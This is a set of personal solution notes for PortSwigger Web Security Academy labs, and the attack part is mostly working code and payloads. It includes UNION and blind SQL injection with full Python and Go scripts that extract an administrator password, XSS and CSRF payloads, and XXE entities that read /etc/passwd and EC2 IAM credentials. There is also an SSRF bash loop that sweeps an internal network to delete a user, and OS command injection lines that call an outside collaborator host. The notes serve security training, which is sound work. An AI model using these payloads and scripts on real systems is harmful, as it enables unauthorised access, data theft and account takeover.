# PortSwigger Lab Solutions

## Check List

- [x] SQL Injection
- [x] XSS
- [x] CSRF
- [x] SSRF
- [x] XXE
- [x] Blind XXE
- [x] OS CMD Injection
- [x] Directory Traversal
- [x] Insecure Deserialization
- [ ] WetW0rk PHP & Java Deserialization
- [ ] WebGoat NodeJS (Optional) DOCKER
- [ ] WebGoat C# 	 (Optional)
- [ ] WebGoat Java	 (Optional) DOCKER


## SQL INJECTION 

## UNION ATTACKS

### Lab 1
* To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.
* ' Union SELECT NULL,NULL,NULL-- <== keep adding nulls until no error occurs that determines amount of columns

```
https://acb21f831f84889a80ac2c4500d700d4.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--
```

### Lab 2
* The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
* 'Union Select NULL,'any string here',NULL-- 
* checking to see what values are passable to which column

```
GET /filter?category='UNION SELECT NULL,'KuT3BJ',NULL-- HTTP/1.1
```

### Lab 3 
 * To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

* Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'--.
* Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+username,+password+FROM+users-- 

```
filter?category='UNION SELECT username,password FROM Users--
```

### Lab 4

* To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
* return username and password in one column
* need to concat strings see string concat below

```
filter?category='UNION SELECT NULL,concat(username,password) FROM users--
```

### String concatenation

### You can concatenate together multiple strings to make a single string.
* Oracle 	'foo'||'bar'
* Microsoft 	'foo'+'bar'
* PostgreSQL 	'foo'||'bar'
* MySQL 	'foo' 'bar' [Note the space between the two strings]
* CONCAT('foo','bar')


### Lab 5 
* SQL injection attack, querying the database type and version on Oracle

* Note On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL

```
 category='UNION SELECT banner,NULL FROM v$version--
/filter?category=%27UNION%20SELECT%20banner,NULL%20FROM%20v$version--
```

### Get Database Versions
### You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
* Oracle 	SELECT banner FROM v$version
* SELECT version FROM v$instance
* Microsoft 	SELECT @@version
* PostgreSQL 	SELECT version()
* MySQL 	SELECT @@version 
* Example => category='UNION SELECT banner,NULL FROM v$version--

### Lab 6 
* SQL injection attack, querying the database type and version on MySQL and Microsoft
* make sure there is a space after ending commment aka -- this is only needed on mysql

```
filter?category='UNION SELECT @@version,NULL-- -
```

### Lab 7 
* SQL injection attack, listing the database contents on non-Oracle databases
* The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 

```
Get Database Type => filter?category='UNION SELECT version(),NULL--

Get Tables from PostGresSQl => /filter?category='UNION SELECT NULL,table_name FROM information_schema.tables--

Get Column names from Table we got from previous query => filter?category='UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_zfuedo'--

Final payload to get usernames and passwords => filter?category='UNION SELECT username_mtdswy,password_kolmqd FROM users_zfuedo--
```

### PostGresSQL Information Schema
* https://www.postgresql.org/docs/9.1/information-schema.html
* https://www.postgresql.org/docs/9.1/infoschema-tables.html
* https://www.postgresql.org/docs/9.1/infoschema-columns.html

### Lab 8
* SQL injection attack, listing the database contents on Oracle
* Reminder ORACLE needs a FROM TABLE for valid query There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL
* ORACLE GET TABLES AND COLUMNS https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2091.htm

```
get list of tables => /filter?category=%27UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--
get list of columns and tables => /filter?category=%27UNION%20SELECT%20table_name,column_name%20FROM%20all_tab_columns--
final payload to get usernames and passwords = => /filter?category=%27UNION%20SELECT%20USERNAME_FRYMIV,PASSWORD_CHBHMG%20FROM%20USERS_QJGEKK--
```

## Blind SQL Injection Labs

### Lab 1
### Blind SQL injection with conditional responses
### Notes
 * Wrote python script pretty slow since its 20 char password.
 * Using Fuff is way better than python script => ffuf -v -request request.txt -request-proto https -w /usr/share/seclists/Fuzzing/alphanum-case.txt:FUZZ -w 20.txt:NUZZ -fs 1467
 * Used Fuff 
#### Steps
 * Send valid sql request => ' Union Select NULL--; this returns "Welcome back!" in html
 * Invalid requests do not return "Welcome Back!" => xyz' UNION SELECT 'a' WHERE 1=1-- RETURN TRUE AKA WELCOME BACK ;;;;; xyz' UNION SELECT 'a' WHERE 1=2--  RETURN FALSE AKA NO WELCOMEBACK
 * Get Length of password 'UNION SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 19 <== use this to get length use gt and lt to get true statments then use = to get exact size
 * WE KNOW THE TABLES SINCE THEY ARE PROVIDED QUERY IS TrackingId='UNION SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password,FUZZ HERE WITH INDEX OF PASSWORD,1) = 'FUZZ HERE'--;session=xpz16W7lPaq5Opfi61QK83azSSxFITat;

```
TrackingId='UNION SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1) = '2'--;session=xpz16W7lPaq5Opfi61QK83azSSxFITat;
THE SUBSTRING RETURNS 1 CHAR AND THE FIRST 1 NEEDS TO BE INCREMENTED SINCE THATS THE WORD INDEX SO YOU ARE CHECKING IF FIRST CHAR OF PASSWORD IS 2
```

#### FFUZ request payload
```
GET /product?productId=7 HTTP/1.1
Host: ac001f411f6efc2f808c360c0062008d.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac001f411f6efc2f808c360c0062008d.web-security-academy.net/
Connection: close
Cookie: TrackingId='UNION SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password,NUZZ,1) = 'FUZZ'--;session=xpz16W7lPaq5Opfi61QK83azSSxFITat; session=dFfQrGX1V08mXpzDIZVWbxzz1Lmv4Tjz
Upgrade-Insecure-Requests: 1
# 20.txt
1
2
3
#alphanumeric.txt
a
b
c..
0
1
2
3
```
#### python exploit below
```python
import requests
from urllib3.exceptions import InsecureRequestWarning
from string import ascii_lowercase
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def sploit(url):
    numbers = [0,1,2,3,4,5,6,7,8,9]
    letters = [x for x in ascii_lowercase]
    payload = letters + numbers 
    #sploit_session = requests.Session()
    for x in range(0,21):
        for c in payload:
            headers = {"Cookie":f"TrackingId='UNION SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password, {x}, 1) = '{c}' --;session=xpz16W7lPaq5Opfi61QK83azSSxFITat"}
            #print(headers)
            resp = requests.get(url,headers=headers,verify=False)
            if "Welcome back!" in resp.text:
                print(f"{c}",flush=True,end="")
def main():
    base = "https://ac001f411f6efc2f808c360c0062008d.web-security-academy.net/"
    route = "product?productId=7"
    url = base + route
    sploit(url)

main()
```
#### Golang exploit below
```go
package main

import(
	"fmt"
	"net/http"
	"strings"
	"io/ioutil"
	"sync"
)
// mutex used to get correct order of password
type SafeCounter struct{
	mux sync.Mutex
	counter map[int]string
}

func exploit(index int, char string, c *SafeCounter) (string,bool){
	payload := fmt.Sprintf("TrackingId='UNION SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password, %d, 1) = '%s' --;",index,char)
	base := "https://ac0d1f0f1e6d6bc380c47b6d002600f5.web-security-academy.net/"
	route := "product?productId=10"
	url := base + route
	client := &http.Client{}
	req,_ := http.NewRequest("GET",url,nil)
	req.Header.Set("Cookie",payload)
	resp,_ := client.Do(req)
	defer resp.Body.Close()
	bytesBody,_ := ioutil.ReadAll(resp.Body)
	bodyString := string(bytesBody)
	if ok := strings.Contains(bodyString,"Welcome back!");ok{
		c.mux.Lock()
		c.counter[index] = char
		c.mux.Unlock()
		return char,true
	}
	return "",false

}

// takes about 19-25 seconds to finish

func main(){
	var wg sync.WaitGroup
	payload := []string{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"}
	numbers := []string{"0","1","2","3","4","5","6","7","8","9"}
	payload = append(payload,numbers...)
	myCounter := SafeCounter{counter: make(map[int]string)}
	for i := 0; i < 21; i++{
		wg.Add(1)
		go func(i int ){
				for _,c:= range payload{
					char,success := exploit(i,c,&myCounter)
					if success == true{
						fmt.Printf("%s Found!\n",char)
						break
					}
				}
			wg.Done()
		}(i)
	}
	wg.Wait()
	fmt.Printf("Password Below!\n")
	for t := 1; t < 21; t++{
		fmt.Printf("%s",myCounter.counter[t])
	}
}
```
#### Speed
 * golang with no go routines vs python with no threads about 6 and a half minutes using linear search
 * could be sped up with quicksort most likely
 * using go routines takes about 20 seconds
 * maybe will attempt with python threads and see differences and binary search


### Lab 2
### Blind SQL injection with conditional errors
 * Conditional staement returns error when sql statement is correct because it uses case statement when true to perform bad division 1/0 which causes an error
 * so anytime you get an error 500 the statement is true
 * get username => 'UNION SELECT CASE WHEN (username='Administrator') THEN to_char(1/0) ELSE NULL END FROM users--'
 * get password length= > 'UNION SELECT CASE WHEN (username='Administrator' AND length(password) > 19) THEN to_char(1/0) ELSE NULL END FROM users--'
 * get password char by char => 'UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,4,1) > 'a' ) THEN to_char(1/0) ELSE NULL END FROM users--'
 * wrote python using binary search on chars increased performance from 6.9 to 1.5 mins no threading
 * wrote golang using binary search and goroutines increased performance from 20 seconds to 8 seconds

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
from string import ascii_lowercase
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def binary_search(full_payload,index,url):
    middle = full_payload[len(full_payload) // 2]
    lower_half = full_payload[:len(full_payload) // 2]
    upper_half = full_payload[len(full_payload) // 2:]
    # test lower
    headers = {"Cookie":f"TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{index},1) < '{middle}') THEN to_char(1/0) ELSE NULL END FROM users--';session=test"}
    resp = requests.get(url,headers=headers,verify=False)
    if resp.status_code == 500:
        return merge(lower_half,index,url)
    # test upper
    headers = {"Cookie":f"TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{index},1) > '{middle}') THEN to_char(1/0) ELSE NULL END FROM users--';session=test"}
    resp = requests.get(url,headers=headers,verify=False)
    if resp.status_code == 500:
        return merge(upper_half,index,url)
    # test match
    headers = {"Cookie":f"TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{index},1) = '{middle}') THEN to_char(1/0) ELSE NULL END FROM users--';session=test"}
    resp = requests.get(url,headers=headers,verify=False)
    if resp.status_code == 500:

        print(f"{middle}",flush=True,end="")
        return
    
def sploit(url):
    numbers = [0,1,2,3,4,5,6,7,8,9]
    letters = [x for x in ascii_lowercase]
    payload =  numbers + letters
    #sploit_session = requests.Session()
    for x in range(1,21):
        # binary search algorithm takes 1.5 mins 
        # linear search about 6.5-6.9 mins
        binary_search(payload,x,url)
def main():
    base = "https://acfd1f4c1edbc75380a436fc0058009e.web-security-academy.net/"
    route = "product?productId=7"
    url = base + route
    sploit(url)

main()
```
* Sorry for bad quality golang

```go
package main

import(
	"fmt"
	"net/http"
	"sync"
	"log"
	"crypto/tls"
)
// mutex used to get correct order of password
type SafeCounter struct{
	mux sync.Mutex
	counter map[int]string
}

func executeRequestLower(char string,index int)int {
	// Generated by curl-to-Go: https://mholt.github.io/curl-to-go
	// TODO: This is insecure; use only in dev environments.
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client2 := &http.Client{Transport: tr}
	req2, err := http.NewRequest("GET", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/product?productId=5", nil)
	if err != nil {
		log.Fatal(err)
	}
	req2.Host = "ac8a1f9c1ec187918060a42000510035.web-security-academy.net"
	req2.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req2.Header.Set("Accept-Encoding", "gzip, deflate")
	req2.Header.Set("Referer", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/")
	req2.Header.Set("Connection", "close")
	payload := fmt.Sprintf("TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,%d,1) < '%s' ) THEN to_char(1/0) ELSE NULL END FROM users--';",index,char)
	req2.Header.Set("Cookie", payload)
	req2.Header.Set("Upgrade-Insecure-Requests", "1")
	req2.Header.Set("Cache-Control", "max-age=0")
	resp2, err := client2.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	defer resp2.Body.Close()
	return resp2.StatusCode
}
func executeRequestUpper(char string,index int)int {
	// Generated by curl-to-Go: https://mholt.github.io/curl-to-go
	// TODO: This is insecure; use only in dev environments.
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client2 := &http.Client{Transport: tr}
	req2, err := http.NewRequest("GET", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/product?productId=5", nil)
	if err != nil {
		log.Fatal(err)
	}
	req2.Host = "ac8a1f9c1ec187918060a42000510035.web-security-academy.net"
	req2.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req2.Header.Set("Accept-Encoding", "gzip, deflate")
	req2.Header.Set("Referer", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/")
	req2.Header.Set("Connection", "close")
	payload := fmt.Sprintf("TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,%d,1) > '%s' ) THEN to_char(1/0) ELSE NULL END FROM users--';",index,char)
	req2.Header.Set("Cookie", payload)
	req2.Header.Set("Upgrade-Insecure-Requests", "1")
	req2.Header.Set("Cache-Control", "max-age=0")
	resp2, err := client2.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	defer resp2.Body.Close()
	return resp2.StatusCode
}

func executeRequestExact(char string,index int)int {
	// Generated by curl-to-Go: https://mholt.github.io/curl-to-go
	// TODO: This is insecure; use only in dev environments.
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client2 := &http.Client{Transport: tr}
	req2, err := http.NewRequest("GET", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/product?productId=5", nil)
	if err != nil {
		log.Fatal(err)
	}
	req2.Host = "ac8a1f9c1ec187918060a42000510035.web-security-academy.net"
	req2.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req2.Header.Set("Accept-Encoding", "gzip, deflate")
	req2.Header.Set("Referer", "https://ac8a1f9c1ec187918060a42000510035.web-security-academy.net/")
	req2.Header.Set("Connection", "close")
	payload := fmt.Sprintf("TrackingId='UNION SELECT CASE WHEN (username='administrator' AND SUBSTR(password,%d,1) = '%s' ) THEN to_char(1/0) ELSE NULL END FROM users--';",index,char)
	req2.Header.Set("Cookie", payload)
	req2.Header.Set("Upgrade-Insecure-Requests", "1")
	req2.Header.Set("Cache-Control", "max-age=0")
	resp2, err := client2.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	defer resp2.Body.Close()
	return resp2.StatusCode
}


func exploit(index int, full_payload []string, c *SafeCounter) (string,bool){
	var middle = full_payload[len(full_payload) / 2 ]
    var lower_half[]string = full_payload[:len(full_payload) / 2 ]
	var upper_half[]string = full_payload[len(full_payload) / 2 :] 
	if ok := executeRequestExact(middle,index); ok == 500 {
		c.mux.Lock()
		c.counter[index] = middle
		c.mux.Unlock()
		fmt.Printf("Found! %s\n",middle)
		return middle,true
	}
	if ok := executeRequestLower(middle,index); ok == 500{
		return exploit(index,lower_half,c)
	}
	if ok := executeRequestUpper(middle,index); ok == 500{
		return exploit(index,upper_half,c)
	}
	fmt.Printf("FAILED \n")
	return "",false
}

// takes about 19-25 seconds to finish without binary search
// with binary search 8 seconds

func main(){
	var wg sync.WaitGroup
	payload := []string{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"}
	numbers := []string{"0","1","2","3","4","5","6","7","8","9"}
	payload = append(numbers,payload...)
	myCounter := SafeCounter{counter: make(map[int]string)}
	for i := 1; i < 21; i++{
		wg.Add(1)
		go func(i int ){
			exploit(i,payload,&myCounter)
			wg.Done()
		}(i)
	}
	wg.Wait()
	fmt.Printf("Password Below!\n")
	for t := 1; t < 21; t++{
		fmt.Printf("%s",myCounter.counter[t])
	}
	fmt.Printf("\nDone\n")
}
```

### Conditional Errors
### You can test a single boolean condition and trigger a database error if the condition is true.
* Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
* Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
* PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
* MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 


### Lab 3 
### Blind SQL injection with time delays
*  The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
* To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

```
TrackingId=x'||pg_sleep(10)--; session=3S7eTWNvdr4sze3MZQ7ivrtVSUhZC6hB
```
* Note Post gres uses || as concat operator i guess


### Lab 4 
### Blind SQL injection with time delays and information retrieval
* remember to url encode
* The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. 
* Get password length
```
x';SELECT CASE WHEN (username='administrator' AND length(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
* perform enumeration of password if it takes long to respond you got a true statement
 ```
 x'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTR(password,1,1)+=+'p')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```

 

 #### Lab 5
 ####
 *  The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
 * To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to the public Burp Collaborator server (burpcollaborator.net). 
 * XML ENTITY INJECT



 #### Lab 6
 ####  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 *  SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
 ```
 filter?category='+OR 1=1-- 
 SELECT * FROM products WHERE category = ''' OR 1=1  #### AND released = 1 
 basically makes it select * from category
 ```

 #### Lab 7
 #### SQL injection vulnerability allowing login bypass

```
administrator'--
password

or

administrator
' OR 1=1--
```

## XSS

## Relective XSS

### Lab 1

#### Reflected XSS into HTML context with nothing encoded

 * classic

```javascript 
<script>alerts("XSS");</script>
```

### Lab 2 

#### Reflected XSS into HTML context with most tags and attributes blocked

* This lab contains a reflected cross-site scripting vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. To solve the lab, perform a cross-site scripting attack that bypasses the WAF and alerts document.cookie.
* use burp intruder and payload is list of tags from XSS cheat sheets  
*  <body onresize="alert(1)">

### Lab 3

#### Reflected XSS into HTML context with most tags and attributes blocked

 * use burp suite and portswigger cheatsheet to use intruder and brute force tags and attributes


 ### Lab 4

 #### Reflected XSS into HTML context with all tags blocked except custom ones

 ```
 <script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

<script>location='https://your-lab-id.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';</script>
 ```

## Stored XSS

### Lab 1

#### Stored XSS into anchor href attribute with double quotes HTML-encoded

```
    Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
    Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
    Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.
    Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1)
    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in your browser. Clicking the name above your comment should trigger an alert.
```

## DOM XSS

### Lab 1 

#### DOM XSS in document.write sink using source location.search

* This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL

```
"><svg onload=alert(1)>
```

## CSRF

### Lab 1

#### CSRF vulnerability with no defenses

```html
<form method="POST" action="acf71fbf1fff5794806e0f4c006d00d5.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="tester@test.com">
</form>
<script>
      document.forms[0].submit();
</script> 	
```

### Lab 2 

#### Validation of CSRF token depends on request method

```
change above payload from POST to GET
```

### Lab 3 

#### Validation of CSRF token depends on token being present

```
remove parameter and value containing token from payload request completely
```

### Lab 4 

#### CSRF token is not tied to the user session

```html
 Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.

Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:

/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key

Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses, ensuring that you include your CSRF token. The exploit should be created from the email change request.

Remove the script block, and instead add the following code to inject the cookie:

<img src="$cookie-injection-url" onerror="document.forms[0].submit()"> 
```
### Lab 5 

#### CSRF where Referer validation depends on header being present

```html
<form method="POST" action="acf71fbf1fff5794806e0f4c006d00d5.web-security-academy.net/email/change-email">
	 <meta name="referrer" content="no-referrer"> 
     <input type="hidden" name="email" value="tester@test.com">
</form>
<script>
      document.forms[0].submit();
</script> 	
```


## XXE

### Lab 1 

#### Exploiting XXE using external entities to retrieve files
 * This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```


### Lab 2


#### Exploiting XXE to perform SSRF attacks
 * This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

 ```
 <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
 ```


 ### Lab 3 

 #### Exploiting XInclude to retrieve files
 * Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
 * payload all the things soap
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```


### Lab 4 

#### XXE attacks via file upload
 * This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
 * payload all the things svg

```
xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## SSRF

### Lab 1 


#### Basic SSRF against the local server

```
stockApi=http%3a//localhost/admin/delete?username=carlos
```

### Lab 2

#### Basic SSRF against another back-end system
 * To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

```sh
# response=$(curl --write-out '%{http_code}' --silent --output /dev/null servername)
for x in {2..254}; do
    responseCode=$(curl --write-out '%{http_code}' --silent --output /dev/null  -i -s -k -X $'POST' \
    -H $'Host: ac491fab1e8e187480e64c86004600fe.web-security-academy.net' -H $'Connection: close' -H $'Content-Length: 61' -H $'User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Accept: */*' -H $'Origin: https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net/product?productId=3' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: session=xrViAAG98e8D50dsaPcJLUcCo759xd7q' \
    -b $'session=xrViAAG98e8D50dsaPcJLUcCo759xd7q' \
    --data-binary $"stockApi=http://192.168.0.$x:8080/admin/delete?username=carlos" \
    $'https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net/product/stock')
    echo "[+] Checking 192.168.0.$x"
    if [ $responseCode != "500" ]; then
        echo "[+] Success ::: $responseCode"
        echo "Vulnerable! ::: 192.168.0.$x" >> results.txt
    fi
    echo "[x]Not Vulnerable ::: Response Code ::: $responseCode"
done
```

### Lab 3

#### SSRF with blacklist-based input filter
 * shorten 127.0.0.1 and double urlencode admin
```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

### Lab 4

#### SSRF with whitelist-based input filter
 * Solution explanation below

 ```
 Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
Append a # to the username and observe that the URL is now rejected.
Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.
 ```
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```
## Blind XXE

### Lab 1


#### Blind XXE with out-of-band interaction 

```
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck>
<foo>
&xxe
</foo>
<productId>3</productId><storeId>1</storeId></stockCheck>
```

### Lab 2

#### Blind XXE with out-of-band interaction via XML parameter entities

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://burpcollaborator.net"> %xxe; ]>
<stockCheck>
<productId>3</productId><storeId>1</storeId></stockCheck>
```

## OS CMD Injection

### Lab 1 

####  OS command injection, simple case

```
productId=2&storeId=1;whoami
```

### Lab 2 

#### Blind OS command injection with time delays

##### Notes
* Use || OR rather than semicolon to break command ;

```
csrf=UVxh3isbiRkyGFByTV5ttV7ubxzvdQvf&name=doesntmatter&email=test%40test.com||sleep+10%3b&subject=doesntmatter&message=doesntmatter
```

### Lab 3 

#### Blind OS command injection with output redirection

##### Notes

* use || on start of command and end of command no semicolons etc

```
email=||whoami > /var/www/images/test2.txt||&subject=TEST&message=TESTING+CMD+INJECTION
```


### Lab 4

#### Blind OS command injection with out-of-band interaction

##### Notes

 * ; or || to start and end with || 

```
csrf=tgrxeRryeFSFwQvjpdx3JWyjjgOUi4Wf&name=TEST&email=TEST%40TEST.COM;ping http://burpcollaborator.net||&subject=TEST&message=TEST
```

## Directory Traversal

### Lab 1

#### File path traversal, simple case

```
filename=../../../etc/passwd
```

### Lab 2

#### File path traversal, traversal sequences blocked with absolute path bypass

```
filename=/etc/passwd
```

### Lab 3


#### File path traversal, traversal sequences stripped non-recursively

```
GET /image?filename=....//....//....//....//....//....//etc/passwd
```

### Lab 4

#### File path traversal, traversal sequences stripped with superfluous URL-decode

##### Notes

* Double urlenocde / to bypass 

```
?filename=..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd
```

### Lab 5

#### File path traversal, validation of start of path

```
GET /image?filename=/var/www/images/../../../../../../etc/passwd HTTP/1.1
```

### Lab 6

#### File path traversal, validation of file extension with null byte bypass

```
GET /image?filename=../../../../../../etc/passwd%00.jpg HTTP/1.1
```

## Insecure Deserialization

* Serialze Object into bytes => Deserialize byte into object
